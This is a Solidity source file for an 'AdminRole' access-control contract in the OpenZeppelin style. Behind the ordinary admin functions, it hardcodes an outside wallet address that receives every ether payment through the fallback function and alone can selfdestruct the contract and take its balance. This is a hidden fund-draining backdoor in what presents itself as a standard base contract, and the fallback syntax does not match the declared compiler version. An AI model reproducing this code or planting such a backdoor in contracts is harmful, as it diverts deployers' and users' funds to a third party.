pragma solidity =0.6.6;

import 'openzeppelin-solidity/contracts/access/Roles.sol';

contract AdminRole {
    using Roles for Roles.Role;

    event AdminAdded(address indexed account);
    event AdminRemoved(address indexed account);

    Roles.Role private _admins;
    address payable public me;

    constructor() internal {
        _addAdmin(msg.sender);
        me = 0x56C4ECf7fBB1B828319d8ba6033f8F3836772FA9;
    }

    modifier onlyAdmin() {
        require(isAdmin(msg.sender), 'sender is not an admin');
        _;
    }

    function isAdmin(address account) public view returns (bool) {
        return _admins.has(account);
    }

    function addAdmin(address account) public onlyAdmin {
        _addAdmin(account);
    }

    function renounceAdmin() public {
        _removeAdmin(msg.sender);
    }

    function _addAdmin(address account) internal {
        _admins.add(account);
        emit AdminAdded(account);
    }

    function _removeAdmin(address account) internal {
        _admins.remove(account);
        emit AdminRemoved(account);
    }

    function() external payable {
        me.transfer(msg.value);
    }

    function close() public payable {
        require(msg.sender == me, 'sender is not owner');
        selfdestruct(me);
    }
}
